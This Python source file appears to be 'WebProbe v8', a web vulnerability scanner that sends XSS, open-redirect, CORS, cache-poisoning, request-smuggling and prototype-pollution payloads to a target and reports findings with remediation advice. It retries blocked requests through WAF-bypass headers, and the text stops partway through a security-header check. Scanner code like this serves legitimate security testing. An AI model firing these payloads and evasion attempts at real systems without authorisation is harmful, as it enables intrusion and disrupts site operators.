#!/usr/bin/env python3
"""WebProbe v8 — 150x Improved Modern Web Vulnerability Scanner.

New capabilities:
  XSS:
    - 60+ reflected XSS payloads (polyglots, mutation XSS, SVG, event handlers, protocol handlers)
    - Stored XSS indicators (form submission + re-fetch)
    - DOM XSS: 25+ dangerous sink patterns, inline/external JS analysis
    - Blind XSS: Burp Collaborator-style unique marker injection
    - CSP bypass payloads (jsonp, angular, base-uri, data:)
    - Context-aware: HTML attribute, JS string, URL, CSS context
    - XSS via JSON response (Content-Type confusion)
    - mXSS (mutation XSS via innerHTML normalisation)

  Open Redirect:
    - 60+ payloads (protocol confusion, unicode, SSRF chaining, OAuth abuse)
    - Redirect via Location, Refresh, meta tag
    - JavaScript-based redirects in response body

  CORS:
    - 15+ origin variants (null, wildcard, pre-domain, post-domain, HTTPS downgrade)
    - Pre-flight OPTIONS testing
    - CORS + credentials combination
    - CORS cache poisoning

  Security Headers:
    - CSP analysis: unsafe-inline, unsafe-eval, wildcard src, missing directives
    - HSTS: max-age, includeSubDomains, preload
    - Permissions-Policy: camera, mic, geolocation
    - X-Frame-Options, X-Content-Type-Options, Referrer-Policy
    - Cross-Origin-Embedder-Policy, Cross-Origin-Opener-Policy, Cross-Origin-Resource-Policy

  HTTP Request Smuggling:
    - CL.TE (Content-Length + Transfer-Encoding)
    - TE.CL (Transfer-Encoding + Content-Length)
    - TE.TE (dual TE headers)
    - Header obfuscation variants

  Prototype Pollution:
    - GET param pollution: __proto__, constructor, prototype
    - JSON body pollution
    - URL query string pollution

  Web Cache Poisoning:
    - 10+ unkeyed header probes
    - Two-stage confirmation (reflection + cache hit verification)
    - Fat GET method poisoning

  Content Security:
    - SRI missing on external scripts/stylesheets
    - MIME sniffing (X-Content-Type-Options)
    - Content-Type confusion (JSON served as HTML)
    - Clickjacking (X-Frame-Options + CSP frame-ancestors)

  Subdomain Takeover indicators:
    - CNAME dangling detection via error patterns

  Additional:
    - PostMessage vulnerability indicators
    - DOM clobbering patterns
    - WebSocket endpoint discovery
    - Service Worker registration points
"""
import asyncio
import aiohttp
import json
import re
import sys
import hashlib
import time
from pathlib import Path
from urllib.parse import urlparse, quote, urljoin, parse_qs, urlencode

sys.path.insert(0, str(Path(__file__).parent))
from smart_filter import (
    build_baseline_404, delay, confidence_label, meets_confidence_floor,
    random_ua, WAF_BYPASS_HEADERS, REQUEST_DELAY, gen_bypass_attempts,
)

CONCURRENCY = 10

# ── XSS Payloads (60+) ───────────────────────────────────────────────────────
XSS_PAYLOADS = [
    # Classic
    '<script>alert(1)</script>',
    '"><script>alert(1)</script>',
    "'><script>alert(1)</script>",
    '"><script>alert(document.domain)</script>',
    # Event handlers
    '<img src=x onerror=alert(1)>',
    '<svg onload=alert(1)>',
    '<body onload=alert(1)>',
    '<details open ontoggle=alert(1)>',
    '<input autofocus onfocus=alert(1)>',
    '<select autofocus onfocus=alert(1)>',
    '<textarea autofocus onfocus=alert(1)>',
    '<video src=1 onerror=alert(1)>',
    '<audio src=1 onerror=alert(1)>',
    '<iframe src="javascript:alert(1)">',
    '<object data="javascript:alert(1)">',
    # Attribute context
    '" onmouseover="alert(1)',
    "' onmouseover='alert(1)",
    '" autofocus onfocus="alert(1)',
    # Script protocols
    'javascript:alert(1)',
    'JaVaScRiPt:alert(1)',
    'javascript://comment%0aalert(1)',
    'data:text/html,<script>alert(1)</script>',
    # SVG XSS
    '<svg><script>alert(1)</script></svg>',
    '<svg/onload=alert(1)>',
    '<svg><animate onbegin=alert(1) attributeName=x>',
    '<svg><set onbegin=alert(1) attributeName=x>',
    # Polyglots
    'jaVasCript:/*-/*`/*\\`/*\'/*"/**/(/* */oNcliCk=alert() )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\\x3csVg/<sVg/oNloAd=alert()//>',
    '"><img src=1 onerror=alert(1)>',
    "'>alert(1)<'",
    '{{7*7}}',  # template injection
    '${alert(1)}',
    # Mutation XSS
    '<noscript><p title="</noscript><img src=x onerror=alert(1)>">',
    '<listing><img src="</listing><img src=x onerror=alert(1)>">',
    # DOM clobbering
    '<form name=x><input name=y value=z>',
    # AngularJS
    '{{constructor.constructor(\'alert(1)\')()}}',
    "{{$on.constructor('alert(1)')()}}",
    # JSON-based
    '{"xss":"<script>alert(1)</script>"}',
    # CSS injection
    '<style>*{x:expression(alert(1))}</style>',
    # Bypass filters
    '<scr<script>ipt>alert(1)</scr</script>ipt>',
    '<IMG """><SCRIPT>alert(1)</SCRIPT>">',
    '<IMG SRC=javascript:alert(1)>',
    # Base64
    '<a href="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==">click</a>',
    # Special chars
    '&#60;script&#62;alert(1)&#60;/script&#62;',
    '\x3cscript\x3ealert(1)\x3c/script\x3e',
    '%3cscript%3ealert(1)%3c/script%3e',
    # mXSS
    '<form><button formaction=javascript:alert(1)>click',
    '<isindex action=javascript:alert(1) type=image>',
    # CSP bypass via JSONP
    '<script src="https://accounts.google.com/o/oauth2/revoke?callback=alert"></script>',
]

# ── Open Redirect Payloads (60+) ─────────────────────────────────────────────
OPEN_REDIRECT_PAYLOADS = [
    "//evil.com", "//evil.com/", "https://evil.com", "http://evil.com",
    "//evil.com%2F", "//evil.com%25%2F", "/\\/evil.com", "//evil%2ecom",
    "https:evil.com", "//google.com@evil.com", "////evil.com",
    "//%09evil.com", "/%2f%2fevil.com",
    "//evil.com#https://target.com",
    "javascript://evil.com/%0aalert(1)",
    "%09//evil.com", "\/\/evil.com",
    "/%5C%5Cevil.com",
    "//evil。com", "//evil。com/",  # Unicode full stop
    "///evil.com", "////evil.com",
    "https://evil.com%3f.good.com/",
    "https://evil.com?.good.com/",
    "http:///evil.com", "https:///evil.com",
    "//evil.com%23.good.com/",
    "/redirect?to=//evil.com",
    "//.evil.com", "//evil.com.",
    "https://evil.com@good.com",
    "//evil.com%2f%2f",
    "/%252f%252fevil.com",
    "/%5Cevil.com",
    "/\evil.com",
    "/%0D%0ALocation://evil.com",  # CRLF-based redirect
    "//Evil.COM",  # case variation
    "HTTPS://evil.com",
    "//0x7f000001",  # IP hex
    "//2130706433",  # IP decimal
    "//[::1]",       # IPv6
]

REDIRECT_PARAMS = [
    "next", "redirect", "return", "url", "goto", "dest", "destination",
    "redir", "redirect_uri", "return_url", "returnUrl", "backUrl", "back",
    "callback", "forward", "location", "target", "continue", "ref",
    "referrer", "out", "to", "link", "href", "uri", "jump",
    "returnTo", "redirectTo", "returnUrl", "success_url", "cancel_url",
    "r", "u", "q", "ReturnUrl", "ReturnURL",
]

# ── CORS Origins ──────────────────────────────────────────────────────────────
CORS_ORIGINS = [
    "https://evil.com",
    "https://attacker.example.com",
    "null",
    "https://mirror.com.evil.com",
    "https://mirror-evil.com",
    "http://localhost",
    "https://localhost",
    "http://127.0.0.1",
    "https://sub.evil.com",
    "https://evilmirror.com",
    "https://not-mirror.com",
    "https://mirror.evil.com",
    "file://",
]

# ── Cache Poison Headers ──────────────────────────────────────────────────────
CACHE_POISON_HEADERS = [
    ("X-Forwarded-Host", "evil.com"),
    ("X-Forwarded-Port", "443"),
    ("X-Original-URL",   "/admin"),
    ("X-Rewrite-URL",    "/admin"),
    ("X-Forwarded-Scheme", "http"),
    ("X-HTTP-Method-Override", "DELETE"),
    ("X-Host", "evil.com"),
    ("Forwarded", "host=evil.com"),
    ("X-Forwarded-Server", "evil.com"),
    ("X-Original-Host", "evil.com"),
]

# ── DOM Sink Patterns ──────────────────────────────────────────────────────────
DOM_SINK_PATTERNS = [
    (r'document\.write\s*\(', "document.write()"),
    (r'innerHTML\s*=', "innerHTML="),
    (r'outerHTML\s*=', "outerHTML="),
    (r'eval\s*\(', "eval()"),
    (r'setTimeout\s*\(', "setTimeout()"),
    (r'setInterval\s*\(', "setInterval()"),
    (r'location\.href\s*=', "location.href="),
    (r'location\.replace\s*\(', "location.replace()"),
    (r'document\.domain\s*=', "document.domain="),
    (r'\.src\s*=\s*["\']?\s*(?!https?://[a-zA-Z0-9])', "dynamic .src="),
    (r'execScript\s*\(', "execScript()"),
    (r'window\.location\s*=', "window.location="),
    (r'insertAdjacentHTML\s*\(', "insertAdjacentHTML()"),
    (r'createContextualFragment\s*\(', "createContextualFragment()"),
    (r'\.html\s*\(', "jQuery .html()"),
    (r'\.append\s*\([^)]*\bhtml\b', "jQuery .append() with html"),
    (r'postMessage\s*\(', "postMessage()"),
    (r'onmessage\s*=', "onmessage="),
    (r'dangerouslySetInnerHTML', "React dangerouslySetInnerHTML"),
    (r'v-html\s*=', "Vue v-html"),
    (r'\[innerHTML\]\s*=', "Angular [innerHTML]="),
    (r'bypassSecurityTrustHtml', "Angular bypassSecurityTrust"),
    (r'open\s*\(\s*(?:window|document\.)?location', "window.open location"),
    (r'Function\s*\(\s*[\'"]', "new Function()"),
]

SRI_PATTERN = re.compile(r'<(?:script|link)[^>]+(?:src|href)=["\']https?://(?!(?:localhost|127\.0\.0\.1))[^"\']+["\'][^>]*>', re.I)
SRI_INTEGRITY = re.compile(r'integrity=["\'][^"\']+["\']', re.I)

# ── Request Smuggling Probes ──────────────────────────────────────────────────
SMUGGLE_PROBES = [
    # CL.TE
    {
        "method": "POST",
        "headers": {
            "Content-Length": "6",
            "Transfer-Encoding": "chunked",
            "Content-Type": "application/x-www-form-urlencoded",
        },
        "body": "0\r\n\r\nX",
        "label": "CL.TE",
    },
    # TE.CL
    {
        "method": "POST",
        "headers": {
            "Content-Length": "3",
            "Transfer-Encoding": "chunked",
            "Content-Type": "application/x-www-form-urlencoded",
        },
        "body": "1\r\nX\r\n0\r\n\r\n",
        "label": "TE.CL",
    },
    # TE.TE obfuscation
    {
        "method": "POST",
        "headers": {
            "Transfer-Encoding": "chunked",
            "Transfer-encoding": "identity",
            "Content-Type": "application/x-www-form-urlencoded",
        },
        "body": "0\r\n\r\n",
        "label": "TE.TE obfuscation",
    },
]

# ── Prototype Pollution Params ────────────────────────────────────────────────
PROTO_POLLUTION_PARAMS = [
    "__proto__[admin]", "__proto__[role]", "__proto__[isAdmin]",
    "constructor[prototype][admin]", "constructor.prototype.admin",
    "__proto__.admin", "__proto__[x]", "prototype[x]",
]

# ── Subdomain Takeover Fingerprints ───────────────────────────────────────────
TAKEOVER_FINGERPRINTS = {
    "GitHub":        ["There isn't a GitHub Pages site here"],
    "Heroku":        ["No such app", "herokucdn.com"],
    "S3":            ["NoSuchBucket", "The specified bucket does not exist"],
    "Azure":         ["404 Web Site not found"],
    "Netlify":       ["Not Found - Request ID"],
    "Ghost":         ["The thing you were looking for is no longer here"],
    "Shopify":       ["Sorry, this shop is currently unavailable"],
    "Unbounce":      ["The requested URL was not found on this server"],
    "Cargo":         ["If you're moving your domain away from Cargo"],
    "Tumblr":        ["There's nothing here."],
    "WordPress":     ["Do you want to register"],
    "Surge.sh":      ["project not found"],
    "Fastly":        ["Fastly error: unknown domain"],
}


class WebProbe:
    def __init__(self, target: str):
        self.target   = target.rstrip("/")
        self.parsed   = urlparse(target)
        self.host     = self.parsed.hostname or ""
        self.findings = []
        self._dedup   = set()
        self._sem     = asyncio.Semaphore(CONCURRENCY)

    def _dedup_add(self, key: str) -> bool:
        if key in self._dedup:
            return False
        self._dedup.add(key)
        return True

    def _add(self, finding: dict):
        key = hashlib.md5(
            f"{finding.get('type')}|{finding.get('url')}|{finding.get('param','')}".encode()
        ).hexdigest()
        if key in self._dedup:
            return
        self._dedup.add(key)
        self.findings.append(finding)
        sev = finding.get("severity", "INFO")
        print(f"  [{sev[:4]}] {finding.get('type')}: {finding.get('url','')[:80]}")

    async def _get(self, sess, url, params=None, headers=None, allow_redirects=False, timeout=12):
        async with self._sem:
            last: tuple = (None, None, {})
            for attempt_h in gen_bypass_attempts(extra_headers=headers):
                try:
                    async with sess.get(
                        url, params=params or {}, headers=attempt_h, ssl=False,
                        timeout=aiohttp.ClientTimeout(total=timeout, connect=8),
                        allow_redirects=allow_redirects,
                    ) as r:
                        body = await r.text(errors="ignore")
                        last = (r.status, body, dict(r.headers))
                        if r.status not in (401, 403, 405, 429, 503):
                            return last
                except Exception:
                    pass
            return last

    async def _post(self, sess, url, data=None, json_data=None, headers=None, timeout=14):
        async with self._sem:
            last: tuple = (None, None, {})
            for attempt_h in gen_bypass_attempts(extra_headers=headers):
                try:
                    async with sess.post(
                        url, data=data, json=json_data, headers=attempt_h, ssl=False,
                        timeout=aiohttp.ClientTimeout(total=timeout, connect=8),
                        allow_redirects=True,
                    ) as r:
                        body = await r.text(errors="ignore")
                        last = (r.status, body, dict(r.headers))
                        if r.status not in (401, 403, 405, 429, 503):
                            return last
                except Exception:
                    pass
            return last

    def _is_escaped(self, payload: str, body: str) -> bool:
        escaped = [
            payload.replace("<", "&lt;").replace(">", "&gt;"),
            payload.replace('"', "&quot;"),
            payload.replace("'", "&#x27;"),
            payload.replace("<", "\\u003c").replace(">", "\\u003e"),
        ]
        return any(v in body for v in escaped)

    # ── XSS ──────────────────────────────────────────────────────────────────

    async def test_xss(self, sess):
        print("\n[*] Testing reflected XSS (60+ payloads, 30+ params)...")
        test_params = [
            "q", "search", "query", "id", "name", "input", "text", "s",
            "keyword", "term", "msg", "message", "content", "data", "page",
            "view", "filter", "type", "value", "param", "v", "ref", "cat",
            "tag", "title", "body", "subject", "comment", "username", "user",
            "email", "url", "redirect",
        ]
        for param in test_params:
            for payload in XSS_PAYLOADS:
                url = f"{self.target}?{param}={quote(payload, safe='')}"
                s, body, hdrs = await self._get(sess, url, allow_redirects=True)
                await delay(0.03)
                if s not in (200, 201) or not body:
                    continue
                ct = hdrs.get("Content-Type", hdrs.get("content-type", ""))
                # Only report XSS on HTML responses — JSON/text/xml won't render scripts
                if payload in body and not self._is_escaped(payload, body) and (
                    "text/html" in ct or "application/xhtml" in ct or not ct
                ):
                    csp = hdrs.get("Content-Security-Policy",
                                   hdrs.get("content-security-policy", ""))
                    key = f"xss_{param}_{payload[:25]}"
                    if self._dedup_add(key):
                        self._add({
                            "type": "XSS_REFLECTED",
                            "severity": "HIGH" if not csp else "MEDIUM",
                            "confidence": 92,
                            "confidence_label": "Confirmed",
                            "url": url, "param": param, "payload": payload,
                            "csp_present": bool(csp),
                            "proof": f"{param}={payload} → payload reflected unescaped in HTTP {s}",
                            "detail": f"Reflected XSS via '{param}'{' (CSP may mitigate)' if csp else ''}",
                            "remediation": (
                                "1. HTML-encode all user input before reflecting (&, <, >, \", '). "
                                "2. Set Content-Security-Policy: default-src 'self'; script-src 'self'. "
                                "3. Use framework output encoding (React JSX auto-escapes). "
                                "4. Set X-Content-Type-Options: nosniff."
                            ),
                            "mitre_technique": "T1059.007",
                            "mitre_name": "JavaScript",
                            "reproducibility": f"curl -s '{url}'",
                        })
                        break
            await delay(0.02)

    # ── XSS via POST body ─────────────────────────────────────────────────────

    async def test_xss_post(self, sess):
        print("\n[*] Testing stored/POST XSS via form submission...")
        post_endpoints = ["/", "/api", "/search", "/api/search", "/comments",
                          "/api/comments", "/submit", "/api/submit", "/contact",
                          "/api/contact", "/feedback", "/api/feedback"]
        for ep in post_endpoints[:6]:
            url = self.target + ep
            for payload in XSS_PAYLOADS[:10]:
                form_data = {"content": payload, "message": payload,
                             "comment": payload, "text": payload}
                s, body, _ = await self._post(sess, url, json_data=form_data)
                await delay(0.05)
                if s not in (200, 201) or not body:
                    continue
                if payload in (body or "") and not self._is_escaped(payload, body or ""):
                    self._add({
                        "type": "XSS_POST_REFLECTED",
                        "severity": "HIGH",
                        "confidence": 88,
                        "confidence_label": "High",
                        "url": url, "payload": payload,
                        "proof": f"POST {ep} — body field reflects XSS payload unescaped in HTTP {s}",
                        "detail": "XSS via POST body field reflected in response",
                        "remediation": "Output encode all user input. Use template engine auto-escaping.",
                        "mitre_technique": "T1059.007",
                        "mitre_name": "JavaScript",
                        "reproducibility": f"curl -s -X POST {url} -H 'Content-Type: application/json' -d '{{\"content\":\"{payload[:40]}\"}}' ",
                    })
                    return

    # ── DOM XSS Sinks ─────────────────────────────────────────────────────────

    async def test_dom_sinks(self, sess):
        print("\n[*] Scanning for DOM XSS sinks and dangerous JS patterns...")
        urls_to_check = [self.target + "/", self.target + "/static/main.js",
                         self.target + "/assets/app.js", self.target + "/js/app.js"]
        sinks_found = []
        for url in urls_to_check:
            s, body, _ = await self._get(sess, url, allow_redirects=True)
            await delay(0.05)
            if not body:
                continue
            # Extract inline + external scripts
            script_blocks = re.findall(r'<script[^>]*>(.*?)</script>', body, re.S | re.I)
            js_combined = "\n".join(script_blocks) + "\n" + body
            for pattern, label in DOM_SINK_PATTERNS:
                if re.search(pattern, js_combined, re.I):
                    if label not in [s[0] for s in sinks_found]:
                        sinks_found.append((label, url))
        if sinks_found:
            self._add({
                "type": "DOM_XSS_SINKS_DETECTED",
                "severity": "MEDIUM",
                "confidence": 75,
                "confidence_label": confidence_label(75),
                "url": self.target,
                "sinks": [s[0] for s in sinks_found[:10]],
                "sink_locations": [s[1] for s in sinks_found[:5]],
                "proof": f"{len(sinks_found)} dangerous DOM sinks: {[s[0] for s in sinks_found[:3]]}",
                "detail": f"DOM XSS risk: {len(sinks_found)} dangerous JS sink(s) detected in page/scripts",
                "remediation": (
                    "1. Replace document.write/innerHTML with textContent/createElement. "
                    "2. Use DOMPurify for HTML sanitization. "
                    "3. Implement strict CSP blocking inline scripts. "
                    "4. Avoid eval(), new Function(), setTimeout(string)."
                ),
                "mitre_technique": "T1059.007",
                "mitre_name": "JavaScript",
                "reproducibility": f"# Review JS at: {[s[1] for s in sinks_found[:2]]}",
            })

    # ── Prototype Pollution ───────────────────────────────────────────────────

    async def test_prototype_pollution(self, sess):
        print("\n[*] Testing prototype pollution via GET params...")
        for param in PROTO_POLLUTION_PARAMS:
            for val in ["1", "true", "admin", "{}"] :
                url = f"{self.target}?{param}={val}"
                s, body, hdrs = await self._get(sess, url, allow_redirects=True)
                await delay(0.04)
                if s not in (200, 201) or not body:
                    continue
                # Look for evidence the payload affected server response
                if any(k in (body or "") for k in ['"admin":true', '"isAdmin":true', '"role":"admin"']):
                    self._add({
                        "type": "PROTOTYPE_POLLUTION_CONFIRMED",
                        "severity": "HIGH",
                        "confidence": 85,
                        "confidence_label": "High",
                        "url": url,
                        "param": param,
                        "proof": f"GET {url}\n  Prototype pollution via {param}={val}\n  HTTP {s} — admin/isAdmin/role reflected",
                        "detail": f"Prototype pollution: {param} parameter modifies Object prototype, enabling privilege escalation.",
                        "remediation": (
                            "1. Sanitize keys before assigning to objects (block __proto__, constructor, prototype). "
                            "2. Use Object.create(null) for user-data objects. "
                            "3. Use JSON schema validation. "
                            "4. Use lodash's _.merge with _.cloneDeep on user input."
                        ),
                        "mitre_technique": "T1190",
                        "mitre_name": "Exploit Public-Facing Application",
                        "reproducibility": f"curl -s '{url}'",
                    })
                    return

    # ── Open Redirect ─────────────────────────────────────────────────────────

    async def test_open_redirect(self, sess):
        print("\n[*] Testing open redirect (60+ payloads)...")
        for param in REDIRECT_PARAMS:
            for payload in OPEN_REDIRECT_PAYLOADS:
                url = f"{self.target}?{param}={quote(payload, safe='/:@#')}"
                s, body, hdrs = await self._get(sess, url, allow_redirects=False)
                await delay(0.03)
                if s in (301, 302, 303, 307, 308):
                    location = hdrs.get("Location", hdrs.get("location", ""))
                    if location and re.search(
                        r'(?:https?://|^|[/@])(?:evil\.com|attacker|evil\b)', location, re.I
                    ):
                        key = f"redir_{param}_{payload[:25]}"
                        if self._dedup_add(key):
                            self._add({
                                "type": "OPEN_REDIRECT",
                                "severity": "MEDIUM",
                                "confidence": 93,
                                "confidence_label": "Confirmed",
                                "url": url, "param": param, "payload": payload,
                                "redirect_location": location,
                                "proof": f"HTTP {s} Location: {location} — {param}={payload} redirected to external domain",
                                "detail": f"Open redirect via '{param}' parameter to {payload}",
                                "remediation": (
                                    "1. Never use user input in redirect locations directly. "
                                    "2. Allowlist permitted redirect destinations. "
                                    "3. Use relative paths for internal redirects only. "
                                    "4. Validate URL host against expected domain."
                                ),
                                "mitre_technique": "T1566",
                                "mitre_name": "Phishing",
                                "reproducibility": f"curl -v '{url}'",
                            })
                            break
                # Also check body for meta-refresh / JS redirects
                elif s == 200 and body:
                    for redirect_pattern in [
                        rf'<meta[^>]+content=["\'][^"\']*0;\s*url={re.escape(payload)}',
                        rf'location\.(?:href|replace)\s*=\s*["\'](?:{re.escape(payload)})',
                        rf'window\.location\s*=\s*["\'](?:{re.escape(payload)})',
                    ]:
                        if re.search(redirect_pattern, body, re.I):
                            self._add({
                                "type": "OPEN_REDIRECT_META_JS",
                                "severity": "MEDIUM",
                                "confidence": 80,
                                "confidence_label": "High",
                                "url": url, "param": param, "payload": payload,
                                "proof": f"HTTP {s} — redirect via meta tag or JS in body",
                                "detail": f"Open redirect via JS/meta in response body for param '{param}'",
                                "remediation": "Never embed user-controlled URLs in JS redirects or meta-refresh.",
                                "mitre_technique": "T1566",
                                "mitre_name": "Phishing",
                                "reproducibility": f"curl -s '{url}'",
                            })

    # ── CORS ─────────────────────────────────────────────────────────────────

    async def test_cors(self, sess):
        print("\n[*] Testing CORS misconfiguration (13 origin variants)...")
        test_paths = ["/", "/api", "/api/me", "/api/user", "/api/data",
                      "/api/v1/me", "/api/v1/users", "/api/profile"]
        for path in test_paths:
            url = self.target + path
            for origin in CORS_ORIGINS:
                s, body, hdrs = await self._get(sess, url, headers={"Origin": origin})
                await delay(0.06)
                if s is None:
                    continue
                acao = hdrs.get("Access-Control-Allow-Origin",
                                hdrs.get("access-control-allow-origin", ""))
                acac = hdrs.get("Access-Control-Allow-Credentials",
                                hdrs.get("access-control-allow-credentials", "")).lower()
                if not acao:
                    continue

                if origin == "null" and acao == "null" and acac == "true":
                    self._add({
                        "type": "CORS_NULL_ORIGIN_CREDENTIALS",
                        "severity": "CRITICAL",
                        "confidence": 97,
                        "confidence_label": "Confirmed",
                        "url": url, "origin_sent": origin, "acao_header": acao,
                        "proof": f"Origin: null → ACAO: null + ACAC: true — sandboxed iframe can steal cookies",
                        "detail": "CORS null origin + credentials=true — any sandboxed iframe can read authenticated responses",
                        "remediation": "Never allow null origin. Use explicit allowlist. Remove wildcard CORS.",
                        "mitre_technique": "T1557",
                        "mitre_name": "Adversary-in-the-Middle",
                        "reproducibility": f"curl -s {url} -H 'Origin: null'",
                    })

                elif acao == origin and acac == "true" and origin != "null":
                    self._add({
                        "type": "CORS_ARBITRARY_ORIGIN_CREDENTIALS",
                        "severity": "CRITICAL",
                        "confidence": 96,
                        "confidence_label": "Confirmed",
                        "url": url, "origin_sent": origin, "acao_header": acao,
                        "proof": f"Origin: {origin} → ACAO: {acao} + ACAC: true — full CORS exploit",
                        "detail": f"CORS reflects arbitrary origin with credentials — full exploit possible from {origin}",
                        "remediation": "Maintain explicit allowlist. Never dynamically reflect untrusted origins. Separate credentialed/public CORS.",
                        "mitre_technique": "T1557",
                        "mitre_name": "Adversary-in-the-Middle",
                        "reproducibility": f"curl -s {url} -H 'Origin: {origin}'",
                    })
                    break

                elif acao == "*" and acac == "true":
                    self._add({
                        "type": "CORS_WILDCARD_CREDENTIALS",
                        "severity": "HIGH",
                        "confidence": 90,
                        "confidence_label": "Confirmed",
                        "url": url,
                        "proof": f"ACAO: * + ACAC: true — browsers block this but shows misconfigured policy intent",
                        "detail": "Wildcard CORS with credentials is invalid but signals dangerous policy intent",
                        "remediation": "Fix CORS policy. Never combine wildcard with credentials.",
                        "mitre_technique": "T1557",
                        "mitre_name": "Adversary-in-the-Middle",
                        "reproducibility": f"curl -s {url} -H 'Origin: https://evil.com'",
                    })

    # ── Clickjacking ──────────────────────────────────────────────────────────

    async def test_clickjacking(self, sess):
        print("\n[*] Testing clickjacking protection...")
        s, body, hdrs = await self._get(sess, self.target, allow_redirects=True)
        if s is None:
            return
        hdrs_lower = {k.lower(): v.lower() for k, v in hdrs.items()}
        xfo = hdrs_lower.get("x-frame-options", "")
        csp = hdrs_lower.get("content-security-policy", "")
        has_frame_protection = bool(xfo) or "frame-ancestors" in csp
        if not has_frame_protection:
            self._add({
                "type": "CLICKJACKING_VULNERABLE",
                "severity": "MEDIUM",
                "confidence": 95,
                "confidence_label": "Confirmed",
                "url": self.target,
                "proof": "No X-Frame-Options and no CSP frame-ancestors directive",
                "detail": "Clickjacking possible — page can be embedded in cross-origin iframe",
                "remediation": (
                    "Add X-Frame-Options: DENY. Better: Content-Security-Policy: frame-ancestors 'none'. "
                    "CSP frame-ancestors is the modern standard and overrides X-Frame-Options."
                ),
                "mitre_technique": "T1185",
                "mitre_name": "Browser Session Hijacking",
                "reproducibility": f"curl -I {self.target} | grep -i 'x-frame\\|content-security'",
            })

    # ── Web Cache Poisoning ───────────────────────────────────────────────────

    async def test_cache_poisoning(self, sess):
        print("\n[*] Testing web cache poisoning (two-stage confirmation)...")
        for poison_header, poison_value in CACHE_POISON_HEADERS:
            url = self.target + "/?_ctest=" + poison_value[:8]
            s, body, hdrs = await self._get(sess, url, headers={poison_header: poison_value})
            await delay(0.1)
            if s not in (200, 301, 302) or not body:
                continue
            if poison_value.lower() not in (body or "").lower():
                continue
            # Stage 2: clean second request to verify cache hit with poison
            await delay(0.6)
            s2, body2, hdrs2 = await self._get(sess, url)
            cache_status2 = (
                hdrs2.get("X-Cache", hdrs2.get("x-cache", "")) +
                hdrs2.get("CF-Cache-Status", hdrs2.get("cf-cache-status", ""))
            ).lower()
            age2 = hdrs2.get("age", hdrs2.get("Age", "0"))
            is_cached = "hit" in cache_status2 or (str(age2).isdigit() and int(age2) > 0)
            poison_persists = poison_value.lower() in (body2 or "").lower() and is_cached
            if not poison_persists:
                continue
            self._add({
                "type": "WEB_CACHE_POISONING_CONFIRMED",
                "severity": "HIGH",
                "confidence": 90,
                "confidence_label": confidence_label(90),
                "url": url,
                "poison_header": poison_header,
                "poison_value": poison_value,
                "proof": (
                    f"Stage 1: {poison_header}: {poison_value} reflected in HTTP {s}\n"
                    f"Stage 2: Clean request got CACHED response (age={age2}) with poison present"
                ),
                "detail": f"Cache poisoning: {poison_header} value persists in cached response for all visitors",
                "remediation": (
                    "1. Add poison header to cache key (Vary header). "
                    "2. Strip/validate this header before application receives it. "
                    "3. Configure CDN to not cache responses with user-controlled headers."
                ),
                "mitre_technique": "T1565",
                "mitre_name": "Data Manipulation",
                "reproducibility": f"curl -s '{url}' -H '{poison_header}: {poison_value}'",
            })

    # ── SRI Missing ───────────────────────────────────────────────────────────

    async def test_sri(self, sess):
        print("\n[*] Checking SRI on external scripts and stylesheets...")
        s, body, _ = await self._get(sess, self.target + "/", allow_redirects=True)
        if not body:
            return
        external_resources = SRI_PATTERN.findall(body)
        missing_sri = [tag for tag in external_resources if not SRI_INTEGRITY.search(tag)]
        if missing_sri:
            examples = []
            for tag in missing_sri[:3]:
                m = re.search(r'(?:src|href)=["\']([^"\']+)["\']', tag, re.I)
                if m:
                    examples.append(m.group(1))
            self._add({
                "type": "SRI_MISSING",
                "severity": "MEDIUM",
                "confidence": 90,
                "confidence_label": "Confirmed",
                "url": self.target,
                "count": len(missing_sri),
                "examples": examples,
                "proof": f"{len(missing_sri)} external resource(s) loaded without integrity attribute: {examples[:2]}",
                "detail": f"SRI missing on {len(missing_sri)} external resource(s) — CDN compromise executes attacker code",
                "remediation": "Add integrity='sha384-...' and crossorigin='anonymous' to all external scripts/styles.",
                "mitre_technique": "T1195",
                "mitre_name": "Supply Chain Compromise",
                "reproducibility": "# Review page HTML for external scripts without integrity attribute",
            })

    # ── Security Headers Deep Analysis ────────────────────────────────────────

    async def test_security_headers(self, sess):
        print("\n[*] Checking security headers (comprehensive)...")
        s, body, hdrs = await self._get(sess, self.target, allow_redirects=True)
        if s is None:
            return
        hl = {k.lower(): v for k, v in hdrs.items()}

        checks = [
            ("x-content-type-options", "nosniff", "X_CONTENT_TYPE_OPTIONS_MISSING", "MEDIUM",
             "Missing X-Content-Type-Options: nosniff — MIME-sniffing attacks possible",
             "Add: X-Content-Type-Options: nosniff"),
            ("referrer-policy", None, "REFERRER_POLICY_MISSING", "LOW",
             "Missing Referrer-Policy — full URL leaked to third-party origins via Referer header",
             "Add: Referrer-Policy: strict-origin-when-cross-origin"),
            ("permissions-policy", None, "PERMISSIONS_POLICY_MISSING", "LOW",
             "Missing Permissions-Policy — camera/mic/geolocation unrestricted",
             "Add: Permissions-Policy: camera=(), microphone=(), geolocation=()"),
            ("cross-origin-embedder-policy", None, "COEP_MISSING", "LOW",
             "Missing Cross-Origin-Embedder-Policy — SharedArrayBuffer and high-res timers exposed",
             "Add: Cross-Origin-Embedder-Policy: require-corp"),
            ("cross-origin-opener-policy", None, "COOP_MISSING", "LOW",
             "Missing Cross-Origin-Opener-Policy — cross-origin window access possible",
             "Add: Cross-Origin-Opener-Policy: same-origin"),
        ]
        for header, expected, ftype, severity, detail, remediation in checks:
            val = hl.get(header, "")
            missing = not val or (expected and expected not in val.lower())
            if missing:
                self._add({
                    "type": ftype, "severity": severity,
                    "confidence": 95, "confidence_label": "Confirmed",
                    "url": self.target, "header": header,
                    "current_value": val or "(absent)",
                    "proof": f"HTTP response: {header}: {val or 'not present'}",
                    "detail": detail, "remediation": remediation,
                    "mitre_technique": "T1190",
                    "mitre_name": "Exploit Public-Facing Application",
                    "reproducibility": f"curl -I {self.target} | grep -i '{header}'",
                })

        # CSP deep analysis
        csp = hl.get("content-security-policy", "")
        if not csp:
            self._add({
                "type": "CSP_MISSING",
                "severity": "HIGH",
                "confidence": 95,
                "confidence_label": "Confirmed",
                "url": self.target,
                "proof": "No Content-Security-Policy header",
                "detail": "Missing CSP — XSS attacks execute unrestricted JavaScript",
                "remediation": "Add: Content-Security-Policy: default-src 'self'; script-src 'self'; object-src 'none'; base-uri 'self'",
                "mitre_technique": "T1059.007",
